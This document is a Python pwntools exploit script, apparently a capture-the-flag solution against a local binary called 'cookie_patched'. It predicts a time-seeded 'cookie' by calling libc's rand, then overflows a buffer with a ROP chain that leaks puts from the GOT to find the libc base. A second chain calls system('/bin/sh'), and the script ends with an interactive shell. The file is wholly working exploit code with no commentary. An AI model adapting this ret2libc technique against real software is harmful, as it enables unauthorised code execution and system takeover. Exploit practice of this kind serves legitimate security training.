from pwn import *
import ctypes
import time

gs = '''
b * main+252
c
'''
exe = ELF('./cookie_patched')
context.terminal = ['tmux', 'splitw', '-h']

# io = process(exe.path)
io = remote("localhost", 50002)

libc = ctypes.CDLL('./libc.so.6')
libc.srand(int(time.time()) >> 5)
cookie = b''
for _ in range(64):
    cookie += (ord('A') + (libc.rand() % 26)).to_bytes()
libc = exe.libc

# gdb.attach(io, gdbscript=gs)
chain  = b''
chain += p64(0x000000000040101a) # ret
chain += p64(0x00000000004011ad) # pop rbp
chain += p64(exe.got['puts'])
chain += p64(0x0000000000401289) # mov rdi, rbp 
chain += p64(exe.plt['puts'])
chain += p64(exe.sym['main'])
payload = flat({
    'daab': cookie,
    'zaac': chain
})
io.clean()
io.sendline(payload)
leak = u64( io.recv(6).ljust(8, b'\x00') )
log.info(f'{hex(leak) = }')
libc.address = leak - 0x87bd0
log.success(f'{hex(libc.address) = }')

chain  = b''
chain += p64(libc.address + 0x000000000002882f) # ret
chain += p64(libc.address + 0x000000000010f75b) # pop rdi
chain += p64(next(libc.search(b'/bin/sh\x00')))
chain += p64(libc.sym['system'])
payload = flat({
    'daab': cookie,
    'zaac': chain
})
io.sendline(payload)
io.clean()

io.interactive()
